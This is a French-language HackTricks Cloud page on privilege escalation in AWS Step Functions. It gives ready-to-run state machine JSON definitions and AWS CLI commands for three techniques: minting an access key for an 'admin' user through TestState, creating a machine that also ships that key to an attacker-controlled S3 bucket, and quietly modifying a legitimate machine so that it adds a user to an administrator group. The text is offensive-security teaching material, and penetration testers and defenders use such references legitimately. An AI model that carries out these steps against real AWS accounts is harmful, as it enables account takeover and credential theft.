# AWS - Step Functions Privesc

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Step Functions

Pour plus d'informations sur ce service AWS, consultez :

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### Ressources de t√¢che

Ces techniques d'escalade de privil√®ges n√©cessiteront d'utiliser certaines ressources de fonction d'√©tape AWS afin d'effectuer les actions d'escalade de privil√®ges souhait√©es.

Pour v√©rifier toutes les actions possibles, vous pouvez vous rendre sur votre propre compte AWS, s√©lectionner l'action que vous souhaitez utiliser et voir les param√®tres qu'elle utilise, comme dans :

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

Ou vous pouvez √©galement consulter la documentation API AWS et v√©rifier la documentation de chaque action :

* [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_AddUserToGroup.html)
* [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API\_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

Un attaquant avec les permissions **`states:TestState`** & **`iam:PassRole`** peut tester n'importe quel √©tat et passer n'importe quel r√¥le IAM sans cr√©er ou mettre √† jour une machine d'√©tat existante, permettant un acc√®s non autoris√© √† d'autres services AWS avec les permissions des r√¥les. potentiellement. Combin√©es, ces permissions peuvent conduire √† des actions non autoris√©es √©tendues, allant de la manipulation des flux de travail √† l'alt√©ration des donn√©es, aux violations de donn√©es, √† la manipulation des ressources et √† l'escalade de privil√®ges.

{% code overflow="wrap" %}
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
{% endcode %}

Les exemples suivants montrent comment tester un √©tat qui cr√©e une cl√© d'acc√®s pour l'utilisateur **`admin`** en tirant parti de ces autorisations et d'un r√¥le permissif de l'environnement AWS. Ce r√¥le permissif devrait avoir une politique √† privil√®ges √©lev√©s associ√©e (par exemple **`arn:aws:iam::aws:policy/AdministratorAccess`**) qui permet √† l'√©tat d'effectuer l'action **`iam:CreateAccessKey`** :

* **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
* **Commande** ex√©cut√©e pour effectuer le privesc :

{% code overflow="wrap" %}
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
{% endcode %}

**Impact potentiel** : Ex√©cution non autoris√©e et manipulation de flux de travail et acc√®s √† des ressources sensibles, pouvant entra√Æner des violations de s√©curit√© significatives.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Un attaquant avec les **`states:CreateStateMachine`** & **`iam:PassRole`** serait capable de cr√©er une machine d'√©tat et de lui fournir n'importe quel r√¥le IAM, permettant un acc√®s non autoris√© √† d'autres services AWS avec les permissions du r√¥le. Contrairement √† la technique de privesc pr√©c√©dente (**`states:TestState`** & **`iam:PassRole`**), celle-ci ne s'ex√©cute pas d'elle-m√™me, vous devrez √©galement avoir les permissions **`states:StartExecution`** ou **`states:StartSyncExecution`** (**`states:StartSyncExecution`** **n'est pas disponible pour les flux de travail standard**, **juste pour les machines d'√©tat express**) afin de d√©marrer une ex√©cution sur la machine d'√©tat.

{% code overflow="wrap" %}
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
{% endcode %}

Les exemples suivants montrent comment cr√©er une machine d'√©tat qui cr√©e une cl√© d'acc√®s pour l'utilisateur **`admin`** et exfiltre cette cl√© d'acc√®s vers un bucket S3 contr√¥l√© par un attaquant, en tirant parti de ces autorisations et d'un r√¥le permissif de l'environnement AWS. Ce r√¥le permissif devrait avoir une politique √† privil√®ges √©lev√©s associ√©e (par exemple **`arn:aws:iam::aws:policy/AdministratorAccess`**) qui permet √† la machine d'√©tat d'effectuer les actions **`iam:CreateAccessKey`** et **`s3:putObject`**.

* **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
* **Commande** ex√©cut√©e pour **cr√©er la machine d'√©tat** :

{% code overflow="wrap" %}
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
{% endcode %}

* **Commande** ex√©cut√©e pour **d√©marrer une ex√©cution** de la machine d'√©tat pr√©c√©demment cr√©√©e :

{% code overflow="wrap" %}
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% endcode %}

{% hint style="warning" %}
Le seau S3 contr√¥l√© par l'attaquant doit avoir des autorisations pour accepter une action s3:PutObject du compte de la victime.
{% endhint %}

**Impact potentiel** : Ex√©cution non autoris√©e et manipulation des flux de travail et acc√®s √† des ressources sensibles, pouvant entra√Æner des violations de s√©curit√© significatives.

### `states:UpdateStateMachine` & (pas toujours requis) `iam:PassRole`

Un attaquant avec la permission **`states:UpdateStateMachine`** serait capable de modifier la d√©finition d'une machine d'√©tat, pouvant ajouter des √©tats furtifs suppl√©mentaires qui pourraient aboutir √† une √©l√©vation de privil√®ges. De cette mani√®re, lorsque qu'un utilisateur l√©gitime d√©marre une ex√©cution de la machine d'√©tat, ce nouvel √©tat furtif malveillant sera ex√©cut√© et l'√©l√©vation de privil√®ges sera r√©ussie.

Selon le niveau de permissivit√© du r√¥le IAM associ√© √† la machine d'√©tat, un attaquant serait confront√© √† 2 situations :

1. **R√¥le IAM permissif** : Si le r√¥le IAM associ√© √† la machine d'√©tat est d√©j√† permissif (il a par exemple la politique **`arn:aws:iam::aws:policy/AdministratorAccess`** attach√©e), alors la permission **`iam:PassRole`** ne serait pas requise pour √©lever les privil√®ges puisque ce ne serait pas n√©cessaire de mettre √† jour le r√¥le IAM, la d√©finition de la machine d'√©tat suffit.
2. **R√¥le IAM non permissif** : Contrairement au cas pr√©c√©dent, ici un attaquant aurait √©galement besoin de la permission **`iam:PassRole`** car il serait n√©cessaire d'associer un r√¥le IAM permissif √† la machine d'√©tat en plus de modifier la d√©finition de la machine d'√©tat.

{% code overflow="wrap" %}
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
{% endcode %}

Les exemples suivants montrent comment mettre √† jour une machine d'√©tat l√©gitime qui invoque simplement une fonction Lambda HelloWorld, afin d'ajouter un √©tat suppl√©mentaire qui ajoute l'utilisateur **`unprivilegedUser`** au groupe IAM **`administrator`**. De cette fa√ßon, lorsqu'un utilisateur l√©gitime d√©marre une ex√©cution de la machine d'√©tat mise √† jour, ce nouvel √©tat furtif malveillant sera ex√©cut√© et l'escalade de privil√®ges sera r√©ussie.

{% hint style="warning" %}
Si la machine d'√©tat n'a pas de r√¥le IAM permissif associ√©, il serait √©galement n√©cessaire d'avoir la permission **`iam:PassRole`** pour mettre √† jour le r√¥le IAM afin d'associer un r√¥le IAM permissif (par exemple, un avec la politique **`arn:aws:iam::aws:policy/AdministratorAccess`** attach√©e).
{% endhint %}

{% tabs %}
{% tab title="Machine d'√âtat L√©gitime" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Machine d'√âtat Malveillante Mise √† Jour" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}
{% endtabs %}

* **Commande** ex√©cut√©e pour **mettre √† jour** **la machine d'√©tat l√©gitime** :

{% code overflow="wrap" %}
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
{% endcode %}

**Impact potentiel** : Ex√©cution non autoris√©e et manipulation de flux de travail et acc√®s √† des ressources sensibles, pouvant entra√Æner des violations de s√©curit√© significatives.

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
